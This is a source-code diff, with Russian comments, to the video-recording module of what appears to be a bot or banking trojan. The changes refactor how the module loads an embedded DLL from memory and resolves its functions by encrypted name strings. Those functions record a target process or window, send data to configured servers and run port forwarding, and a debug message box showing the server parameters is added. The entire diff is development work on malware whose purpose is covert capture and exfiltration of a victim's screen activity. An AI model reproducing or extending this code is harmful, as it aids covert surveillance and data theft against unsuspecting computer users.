@@ -69,40 +69,42 @@ namespace VideoRecorder
 //                                    TVideoRecDLL
 //*****************************************************************************
 TVideoRecDLL::TVideoRecDLL()
+	: TDLL(VideoRecorder::data)
 {
 	// Загружаем библиотеку и инициализируем апи
-	FHandle = MemoryLoadLibrary(VideoRecorder::data);
 	InitializeApi();
 }
 //-------------------------------------------------------------------
 
 TVideoRecDLL::~TVideoRecDLL()
 {
-	if (FHandle)
-		MemoryFreeLibrary(FHandle);
 
 }
 //-------------------------------------------------------------------
 
-void TVideoRecDLL::LoadFunc(LPVOID *Addr, const char* Name)
+void TVideoRecDLL::LoadFunc(const char* Name, LPVOID &Addr)
 {
 	// Функция загружает функцию библиотеки
 	// Функция расчитывает на то, что строка Name зашифрована
-	if (FHandle)
-		*Addr = MemoryGetProcAddress(FHandle, GetStr(Name).t_str());
-	else
-		*Addr = NULL;
+	Addr = GetProcAddress(GetStr(Name));
 }
 //-------------------------------------------------------------------
 
 void TVideoRecDLL::InitializeApi()
 {
-	LoadFunc((LPVOID*)&RecordProcess,   VideRecFuncRecordProcess);
-	LoadFunc((LPVOID*)&RecordWnd,       VideRecFuncRecordWnd);
-	LoadFunc((LPVOID*)&Stop,            VideRecFuncStop);
-	LoadFunc((LPVOID*)&ResetTimer,      VideRecFuncResetTimer);
-	LoadFunc((LPVOID*)&SendData,        VideRecFuncSendData);
-	LoadFunc((LPVOID*)&RunPortForward,	VideRecFuncRunPortForward);
+	LoadFunc(VideRecFuncRecordProcess,  (LPVOID&)RecordProcess);
+	LoadFunc(VideRecFuncRecordWnd,      (LPVOID&)RecordWnd);
+	LoadFunc(VideRecFuncStop,           (LPVOID&)Stop);
+	LoadFunc(VideRecFuncResetTimer,     (LPVOID&)ResetTimer);
+	LoadFunc(VideRecFuncSendData,       (LPVOID&)SendData);
+	LoadFunc(VideRecFuncRunPortForward, (LPVOID&)RunPortForward);
+
+//	LoadFunc((LPVOID*)&RecordProcess,   VideRecFuncRecordProcess);
+//	LoadFunc((LPVOID*)&RecordWnd,       VideRecFuncRecordWnd);
+//	LoadFunc((LPVOID*)&Stop,            VideRecFuncStop);
+//	LoadFunc((LPVOID*)&ResetTimer,      VideRecFuncResetTimer);
+//	LoadFunc((LPVOID*)&SendData,        VideRecFuncSendData);
+//	LoadFunc((LPVOID*)&RunPortForward,	VideRecFuncRunPortForward);
 }
 
 
@@ -133,6 +135,15 @@ void TVideoRecorder::RecordProcess(DWORD PID)
 	if (FDLL.RecordProcess)
 	{
 		if (!PID) PID = Bot->PID();
+		string S;
+
+		S.Format("UID: %s\r\n VideoName: %s\r\n PID: %d\r\nServer1: %s\r\nPort1: %d",
+			UID.t_str(), VideoName.t_str(), PID,
+			Server.t_str(), Port
+			);
+
+		MessageBoxA(NULL, S.t_str(), NULL, 0);
+
 		FDLL.RecordProcess(UID.t_str(), VideoName.t_str(), PID,
 						   Server.t_str(), Port,
 						   Server2.t_str(), Port2, RecordTime, 0);
